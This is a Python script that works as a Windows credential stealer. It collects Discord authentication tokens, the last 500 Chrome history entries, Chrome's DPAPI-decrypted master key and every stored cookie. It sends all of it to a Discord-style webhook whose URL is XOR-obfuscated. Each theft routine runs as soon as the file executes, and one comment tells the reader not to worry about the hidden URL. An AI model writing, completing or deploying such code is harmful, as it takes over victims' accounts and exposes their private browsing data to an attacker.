import time
import os
import re
import sqlite3
import shutil
import requests
import win32crypt  # Part of pywin32
import base64
import json

key = "Impossible"
Encrypted_URL = bytes([33, 25, 4, 31, 0, 73, 70, 77, 8, 12, 58, 14,]) #This is the encrypted webhook URL dw aboout this
#Redacted

def firsthing(a, b):
    if a == b:
        time.sleep(10)
    else:
        time.sleep(10)


def xor_decryption(enc_url, dec_key):
    temp = bytearray()
    keybyte = dec_key.encode()
    for i in range(0, len(enc_url)):
        temp.append(enc_url[i] ^ keybyte[i % len(keybyte)])
    return temp.decode()


def send_data(message):
    data = {
        "content" : message
    }
    requests.post(xor_decryption(Encrypted_URL, key), json=data)


def get_discord_token():
    paths = [
        os.getenv('APPDATA') + '\\Discord\\Local Storage\\leveldb\\',
        os.getenv('APPDATA') + '\\discordcanary\\Local Storage\\leveldb\\',
        os.getenv('APPDATA') + '\\discordptb\\Local Storage\\leveldb\\',
    ]

    token_regex = re.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}")
    mfa_regex = re.compile(r"mfa\.[\w-]{84}")

    tokens_found = []

    for path in paths:
        if not os.path.exists(path):
            continue
        for filename in os.listdir(path):
            if not filename.endswith(('.log', '.ldb')):
                continue
            with open(path + filename, 'r', errors='ignore') as file:
                for line in file:
                    for token in token_regex.findall(line):
                        tokens_found.append(token)
                    for mfa in mfa_regex.findall(line):
                        tokens_found.append(mfa)

    return list(set(tokens_found))  # remove duplicates

tokens = get_discord_token()
    
send_data(f"Discord tokens from local machine: {tokens}")



def extract_chrome_history():
    history_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Default\History")
    tmp_history = "History_temp.db"

    # Copy database to avoid 'locked' errors
    try:
        shutil.copy2(history_path, tmp_history)
    except Exception as e:
        send_data(f"Error copying history DB: {e}")
        return

    try:
        conn = sqlite3.connect(tmp_history)
        conn.text_factory = bytes
        cursor = conn.cursor()

        cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500;")

        rows = cursor.fetchall()
        send_data("\n Last 500 Browsing History Entries:\n")
        for url, title, visits, last_time in rows:
            send_data(f"Title: {title}\nURL: {url}\nVisits: {visits}\n---")

        conn.close()
        os.remove(tmp_history)

    except Exception as e:
        send_data(f"Error reading history DB: {e}")

extract_chrome_history()





def get_encryption_key():
    local_state_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Local State")
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    
    send_data("Chrome Master Key (decrypted):", decrypted_key.hex())
    return decrypted_key


def extract_all_encrypted_cookies():
    key = get_encryption_key()

    db_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Default\Network\Cookies")
    temp_db = "chrome_cookies_temp.db"

    try:
        shutil.copy2(db_path, temp_db)
    except Exception as e:
        send_data(f"[!] Error copying cookie DB: {e}")
        return

    try:
        conn = sqlite3.connect(temp_db)
        conn.text_factory = bytes  # Avoid UTF-8 decoding issues
        cursor = conn.cursor()

        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        rows = cursor.fetchall()

        send_data("\nAll Encrypted Chrome Cookies:\n")
        for host, name, encrypted in rows:
            send_data(f"[{host.decode(errors='ignore')}] {name.decode(errors='ignore')} = {encrypted.hex()}")

        conn.close()
        os.remove(temp_db)

    except Exception as e:
        send_data(f"[!] Error reading cookie DB: {e}")

extract_all_encrypted_cookies()
